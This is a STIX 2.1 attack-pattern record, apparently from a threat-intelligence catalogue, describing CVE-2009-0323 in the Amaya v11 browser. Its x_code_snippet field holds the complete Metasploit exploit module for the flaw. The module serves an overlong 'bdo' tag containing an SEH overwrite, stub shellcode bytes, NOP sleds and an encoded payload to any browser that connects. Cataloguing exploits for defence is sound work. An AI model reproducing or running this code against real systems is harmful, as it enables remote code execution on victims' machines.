{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--38ad0700-df88-4b03-a1b0-790723edeb84",
    "created": "2024-08-14T16:43:14.293156Z",
    "modified": "2024-08-14T16:43:14.29316Z",
    "name": "\"Amaya Browser v11.0 bdo Tag Overflow\"",
    "description": " This module exploits a stack buffer overflow in the Amaya v11 Browser. By sending an overly long string to the \"bdo\" tag, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/amaya_bdo.rb",
            "external_id": "amaya_bdo.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0323"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"Amaya Browser v11.0 'bdo' Tag Overflow\",\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Amaya v11 Browser.\n          By sending an overly long string to the \"bdo\"\n          tag, an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'dookie, original exploit by Rob Carter' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0323' ],\n          [ 'OSVDB', '55721' ],\n          [ 'BID', '33046' ],\n          [ 'BID', '33047' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 970,\n          'BadChars'      => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Amaya Browser v11',     { 'Offset' => 6889, 'Ret' => 0x02101034 } ], # wxmsw28u_core_vc_custom.dll\n        ],\n      'DisclosureDate' => '2009-01-28',\n      'DefaultTarget'  => 0))\n  end\n\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Set the exploit buffer\n    sploit = \"<bdo dir=\\\"\"\n    sploit += rand_text_alpha(6889)\n    sploit += \"\\x74\\x06\\x41\\x41\"\n    sploit += [target.ret].pack('V')\n    sploit += \"\\x68\\x7f\\x01\\x01\\x7f\"   # push 7F01017F\n    sploit += \"\\x58\"\t\t   # pop EAX\n    sploit += \"\\x2d\\x18\\x69\\x45\\x7d\"   # sub EAX, 7A7A0857\n    sploit += \"\\x50\"\t\t   # push EAX\n    sploit += \"\\xc3\"\t\t   # RETN\n    sploit += make_nops(100)\n    sploit += payload.encoded\n    sploit += make_nops(970 - payload.encoded.length)\n    sploit += \"\\\">pwned!</bdo>\"\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, sploit)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-01-28",
    "x_mitre_platforms": [
        "win'"
    ]
}